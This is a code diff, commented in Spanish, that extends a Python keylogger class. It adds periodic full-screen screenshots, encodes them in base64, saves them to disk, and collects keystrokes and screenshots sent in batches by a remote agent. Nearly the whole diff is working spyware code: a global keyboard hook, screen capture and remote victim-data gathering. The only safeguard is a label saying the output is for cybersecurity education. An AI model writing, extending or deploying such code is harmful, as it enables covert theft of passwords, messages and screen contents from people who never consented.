@@ -20,6 +20,17 @@ from datetime import datetime
 import threading
 import os
 import json
+import base64
+import io
+
+# Captura de pantalla
+try:
+    import mss
+    import mss.tools
+    from PIL import Image
+    _SCREENSHOT_AVAILABLE = True
+except ImportError:
+    _SCREENSHOT_AVAILABLE = False
 
 
 class Keylogger:
@@ -34,10 +45,12 @@ class Keylogger:
         self.is_running = False
         self.start_time = None
         self.hook = None
+        # ── Capturas de Pantalla ────────────────────────────────────────
+        self.screenshots = []  # Lista de dicts {timestamp, data(base64), index}
 
         # ── Modo Remoto ──────────────────────────────────────────────
-        # Buffer thread-safe para teclas enviadas por remote_agent.py
         self._remote_keys: list = []
+        self._remote_screenshots: list = []
         self._remote_lock = threading.Lock()
         self._remote_agent_info: dict = {}
         self._remote_complete: bool = False
@@ -88,12 +101,37 @@ class Keylogger:
         
         return 'especial'
     
-    def start(self, duration=10):
+    def _take_screenshot(self):
         """
-        Inicia la captura de teclas por un tiempo limitado.
-        
+        Toma una captura de pantalla y la devuelve como string Base64 (PNG).
+        Retorna None si la captura de pantalla no está disponible.
+        """
+        if not _SCREENSHOT_AVAILABLE:
+            return None
+        try:
+            with mss.mss() as sct:
+                raw = sct.grab(sct.monitors[0])
+                img = Image.frombytes('RGB', raw.size, raw.bgra, 'raw', 'BGRX')
+                # Reducir tamaño para no saturar la red (max 1280px de ancho)
+                if img.width > 1280:
+                    ratio = 1280 / img.width
+                    img = img.resize(
+                        (1280, int(img.height * ratio)),
+                        Image.LANCZOS
+                    )
+                buf = io.BytesIO()
+                img.save(buf, format='JPEG', quality=70)
+                return base64.b64encode(buf.getvalue()).decode('utf-8')
+        except Exception:
+            return None
+
+    def start(self, duration=10, screenshot_interval=5):
+        """
+        Inicia la captura de teclas y capturas de pantalla periódicas.
+
         Args:
-            duration: Duración máxima en segundos (máx 30)
+            duration:            Duración máxima en segundos (máx 30)
+            screenshot_interval: Cada cuántos segundos tomar captura (0 = desactivado)
         """
         if self.is_running:
             return {'success': False, 'error': 'El keylogger ya está en ejecución.'}
@@ -104,17 +142,36 @@ class Keylogger:
             duration = 30
         
         self.keys_log = []
+        self.screenshots = []
         self.is_running = True
         self.start_time = datetime.now()
         
         try:
-            # Evento para controlar la duración de la captura
             stop_event = threading.Event()
 
-            # Registrar el hook de teclado
+            # Hook del teclado
             keyboard.on_press(self._on_key_event)
 
-            # Esperar la duración indicada mediante un timer
+            # ── Hilo de capturas de pantalla ────────────────────────────
+            if screenshot_interval > 0 and _SCREENSHOT_AVAILABLE:
+                def screenshot_loop():
+                    idx = 0
+                    while not stop_event.is_set():
+                        stop_event.wait(screenshot_interval)
+                        if stop_event.is_set():
+                            break
+                        img_b64 = self._take_screenshot()
+                        if img_b64:
+                            idx += 1
+                            self.screenshots.append({
+                                'index': idx,
+                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                                'data': img_b64
+                            })
+                scr_thread = threading.Thread(target=screenshot_loop, daemon=True)
+                scr_thread.start()
+
+            # Timer de duración
             timer = threading.Timer(duration, stop_event.set)
             timer.start()
             stop_event.wait()
@@ -124,7 +181,6 @@ class Keylogger:
             keyboard.unhook_all()
             self.is_running = False
             
-            # Reconstruir el texto capturado
             captured_text = self._reconstruct_text()
             stats = self._generate_stats()
             
@@ -134,7 +190,10 @@ class Keylogger:
                 'total_keys': len(self.keys_log),
                 'duration': duration,
                 'captured_text': captured_text,
-                'stats': stats
+                'stats': stats,
+                'screenshots': self.screenshots,
+                'total_screenshots': len(self.screenshots),
+                'screenshots_available': _SCREENSHOT_AVAILABLE
             }
             
         except Exception as e:
@@ -193,28 +252,49 @@ class Keylogger:
             'special': total - types.get('letra', 0) - types.get('número', 0) - types.get('símbolo', 0)
         }
     
-    def save_log(self, filepath, keys, captured_text=''):
-        """Guarda el registro de teclas en un archivo JSON."""
+    def save_log(self, filepath, keys, captured_text='', screenshots=None):
+        """Guarda el registro de teclas en un archivo JSON y las capturas como imágenes."""
         try:
             directory = os.path.dirname(filepath)
             if directory and not os.path.exists(directory):
                 os.makedirs(directory, exist_ok=True)
-            
+
+            # ── Guardar capturas de pantalla ────────────────────────────
+            saved_screenshots = []
+            base_path = filepath.replace('.json', '')
+            if screenshots:
+                for scr in screenshots:
+                    img_path = f"{base_path}_screenshot_{scr['index']:02d}.jpg"
+                    try:
+                        img_bytes = base64.b64decode(scr['data'])
+                        with open(img_path, 'wb') as f:
+                            f.write(img_bytes)
+                        saved_screenshots.append({
+                            'index': scr['index'],
+                            'timestamp': scr['timestamp'],
+                            'file': os.path.abspath(img_path)
+                        })
+                    except Exception:
+                        pass
+
             log_data = {
                 'capture_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                 'total_keys': len(keys),
                 'captured_text': captured_text,
+                'total_screenshots': len(saved_screenshots),
+                'screenshots': saved_screenshots,
                 'warning': 'Este archivo es solo para fines educativos de Ciberseguridad',
                 'keys': keys
             }
-            
+
             with open(filepath, 'w', encoding='utf-8') as f:
                 json.dump(log_data, f, indent=2, ensure_ascii=False)
-            
+
             return {
                 'success': True,
                 'filepath': os.path.abspath(filepath),
-                'total_saved': len(keys)
+                'total_saved': len(keys),
+                'screenshots_saved': len(saved_screenshots)
             }
         except PermissionError:
             return {
@@ -236,31 +316,30 @@ class Keylogger:
         """
         with self._remote_lock:
             self._remote_keys = []
+            self._remote_screenshots = []
             self._remote_complete = False
             self._remote_agent_info = agent_info
         return {'success': True, 'message': f"Agente {agent_info.get('agent_ip')} registrado en modo keylogger."}
 
-    def receive_remote_keys(self, keys: list, final: bool = False):
+    def receive_remote_keys(self, keys: list, screenshots: list = None, final: bool = False):
         """
-        Recibe un lote de teclas desde remote_agent.py y las acumula.
-
-        Args:
-            keys:  Lista de dicts con info de cada tecla.
-            final: True si es el último lote (captura completa).
+        Recibe un lote de teclas y/o capturas desde remote_agent.py.
         """
         with self._remote_lock:
             self._remote_keys.extend(keys)
+            if screenshots:
+                self._remote_screenshots.extend(screenshots)
             if final:
                 self._remote_complete = True
-        return {'success': True, 'received': len(keys)}
+        return {'success': True, 'received': len(keys), 'screenshots_received': len(screenshots or [])}
 
     def get_remote_results(self):
         """
-        Devuelve las teclas acumuladas hasta el momento.
-        Llamado periódicamente por el frontend (polling).
+        Devuelve las teclas y capturas acumuladas hasta el momento.
         """
         with self._remote_lock:
             keys = list(self._remote_keys)
+            screenshots = list(self._remote_screenshots)
             complete = self._remote_complete
             agent = dict(self._remote_agent_info)
 
@@ -274,7 +353,9 @@ class Keylogger:
             'complete': complete,
             'agent': agent,
             'duration': agent.get('duration', 0),
-            'stats': stats
+            'stats': stats,
+            'screenshots': screenshots,
+            'total_screenshots': len(screenshots)
         }
 
     def _reconstruct_text_from(self, keys: list):
